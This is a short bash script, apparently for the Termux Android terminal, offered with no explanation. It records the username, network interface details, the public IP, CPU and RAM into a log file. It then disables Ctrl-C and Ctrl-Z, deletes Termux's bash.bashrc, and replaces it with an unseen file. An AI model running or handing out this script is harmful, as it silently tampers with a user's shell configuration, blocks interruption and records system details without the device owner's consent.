yap () {
  ju=$(whoami)
  ifc=$(ifconfig)
  ip=$(curl ifconfig.me)
  all=$(curl ifconfig.me)
  cpu=$(lscpu)
  ram=$(free -m )

  setterm --foreground green
  echo -e "usuario: $ju \n ip privada: $ifc \n ip publica: $ip \n all ip: $all \n cpu: $cpu \n ram info: $ram " 
}
yap > log.txt
trap '' INT TSTP
rm /data/data/com.termux/files/usr/etc/bash.bashrc

mv bash.bashrc /data/data/com.termux/files/usr/etc/
